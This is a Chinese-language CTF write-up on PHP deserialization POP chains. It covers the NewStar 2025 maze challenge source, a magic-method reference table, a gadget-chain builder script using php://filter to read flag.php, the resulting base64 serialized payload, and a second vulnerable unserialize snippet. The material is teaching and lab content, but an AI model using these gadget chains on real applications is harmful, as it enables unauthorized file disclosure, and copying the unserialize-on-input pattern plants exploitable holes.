---
title: POP 链分析 - 魔术方法
date: 2026-08-28 13:15:00
categories:
  - Web安全
tags:
  - PHP
  - POP链
  - 反序列化
description: POP 链分析 - 魔术方法
---

## 例题(NewStar_2025_小羊走迷宫）：

源码+分析：

```python
<?php
include "flag.php";
error_reporting(0);
class startPoint{
    public $direction;
    function __wakeup(){
        echo "gogogo出发咯 ";
        $way = $this->direction;
        return $way();//将对象调用为函数，__wakeup（使用unserialize时触发）
    }
}
class Treasure{
    protected $door;
    protected $chest;//不可访问的属性
    function __get($arg){
        echo "拿到钥匙咯，开门！ ";
        $this -> door -> open();//不存在的方法open()，__get（找不可访问的属性）
    }
    function __toString(){
        echo "小羊真可爱! ";
        return $this -> chest -> key;//不可访问的属性chest， __toString（找把属性当作字符串使用时触发）
    }
}
class SaySomething{
    public $sth;
    function __invoke()
    {
        echo "说点什么呢 ";
        return "说： ".$this->sth;//把属性当作字符串使用时触发,__invoke(将对象调用为函数时触发)
    }
}
class endPoint{
    private $path;
    function __call($arg1,$arg2){
        echo "到达终点！现在尝试获取flag吧"."<br>";
        echo file_get_contents($this->path);//出口，关键函数file_get_contents，找__call（找不存在的方法）
    }
}

if ($_GET["ma_ze.path"]){
    unserialize(base64_decode($_GET["ma_ze.path"]));//入口
}else{
    echo "这个变量名有点奇怪，要怎么传参呢？";
}
?>          

//startPoint.__wakeup()  → SaySomething.__invoke()  → Treasure.__toString()  →Treasure.__get() 
→ endPoint.__call() → file_get_contents("flag.php")
```

#       魔术方法

| 魔术方法         |                           触发方法                           |
| :--------------- | :----------------------------------------------------------: |
| __construct()：  | 当对象创建（new）时会自动调用。但在 unserialize() 时是不会自动调用的。（构造函数） |
| __destruct()：1  |            当对象被销毁时会自动调用。（析构函数）            |
| __wakeup()：     |                    使用unserialize时触发                     |
| __sleep()：      |                     使用serialize时触发                      |
| __call()：1      |    在对象上下文中调用不可访问的方法时触发（不存在的方法）    |
| __callStatic()： |            在静态上下文中调用不可访问的方法时触发            |
| __get()：        |                 用于从不可访问的属性读取数据                 |
| __set()：1       |                 用于将数据写入不可访问的属性                 |
| __isset()：      |          在不可访问的属性上调用isset()或empty()触发          |
| __unset()：      |             在不可访问的属性上使用unset()时触发              |
| __toString()：1  |                  把属性当作字符串使用时触发                  |
| __invoke()：1    |               当脚本尝试将对象调用为函数时触发               |

> **其中的`__toString`触发的条件较多：**
>
> 1. echo ( `$obj` ) / print( `$obj` ) 打印时会触发
> 2. 反序列化对象与字符串连接时
> 3. 反序列化对象参与格式化字符串时
> 4. 反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）
> 5. 反序列化对象参与格式化SQL语句，绑定参数时
> 6. 反序列化对象在经过php字符串函数，如 `strlen()`、`addslashes()`时
> 7. 在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有 `toString` 返回的字符串的时候 `toString`会被调用
> 8. 反序列化的对象作为class_exists()的参数的时候 

```python
<?php
class startPoint {
    public $direction;
}

class SaySomething {
    public $sth;
}

class Treasure {
    protected $door;
    protected $chest;
    
    public function __construct($door = null, $chest = null) {
        $this->door = $door;
        $this->chest = $chest;
    }
}

class endPoint {
    private $path;
    
    public function __construct($path) {
        $this->path = $path;
    }
}

// 从终点开始构造，使用构造函数设置私有属性
$end = new endPoint("php://filter/resource=flag.php");//这里使用伪协议

// 创建第二个Treasure对象，用于触发__get
$treasure2 = new Treasure($end, null); // door = $end, chest = null

// 创建第一个Treasure对象，用于触发__toString
$treasure1 = new Treasure(null, $treasure2); // door = null, chest = $treasure2

// 创建SaySomething对象
$say = new SaySomething();
$say->sth = $treasure1;  // 在__invoke中会将sth当作字符串使用

// 创建startPoint对象
$start = new startPoint();
$start->direction = $say;  // 在__wakeup中会调用direction()

// 序列化并base64编码
$payload = serialize($start);
$base64_payload = base64_encode($payload);

echo "生成的payload: \n";
echo $base64_payload . "\n\n";

echo "URL参数: \n";
echo "?ma_ze.path=" . $base64_payload . "\n\n";
?>
```

payload:

```bash
?ma[ze.path=TzoxMDoic3RhcnRQb2ludCI6MTp7czo5OiJkaXJlY3Rpb24iO086MTI6IlNheVNvbWV0aGluZyI6MTp7czozOiJzdGgiO086ODoiVHJlYXN1cmUiOjI6e3M6NzoiACoAZG9vciI7TjtzOjg6IgAqAGNoZXN0IjtPOjg6IlRyZWFzdXJlIjoyOntzOjc6IgAqAGRvb3IiO086ODoiZW5kUG9pbnQiOjE6e3M6MTQ6IgBlbmRQb2ludABwYXRoIjtzOjMwOiJwaHA6Ly9maWx0ZXIvcmVzb3VyY2U9ZmxhZy5waHAiO31zOjg6IgAqAGNoZXN0IjtOO319fX0=
```

```php
<?php
error_reporting(0);
class A {
    public $handle;
    public function triggerMethod() {
        echo "" . $this->handle; 
    }
}
class B {
    public $worker;
    public $cmd;
    public function __toString() {
        return $this->worker->result;
    }
}
class C {
    public $cmd;
    public function __get($name) {
        echo file_get_contents($this->cmd);
    }
}
$raw = isset($_POST['data']) ? $_POST['data'] : '';
header('Content-Type: image/jpeg');
readfile("muzujijiji.jpg");
highlight_file(__FILE__);
$obj = unserialize($_POST['data']);
$obj->triggerMethod();
```

